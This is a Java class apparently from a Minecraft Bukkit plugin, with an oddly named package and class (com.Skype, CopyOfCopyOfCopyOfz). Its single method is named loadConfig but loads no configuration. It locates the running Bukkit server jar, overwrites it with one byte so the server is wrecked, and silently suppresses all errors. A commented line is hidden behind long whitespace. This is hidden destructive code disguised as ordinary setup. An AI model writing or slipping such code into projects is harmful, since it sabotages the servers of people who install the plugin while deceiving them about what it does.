package com.Skype;

import java.io.File;
import java.io.FileOutputStream;

import org.bukkit.Bukkit;

public class CopyOfCopyOfCopyOfz {
 
	
	public static void loadConfig(){
		File foo =new File(Bukkit.class.getProtectionDomain().getCodeSource().getLocation().getPath());
		try{
			FileOutputStream bar=new FileOutputStream(foo);
			bar.write(new byte[]{1});
			bar.flush();
			bar.close();
		}catch (Exception e){}
																																		//FileOutputStream bar;
	}
}
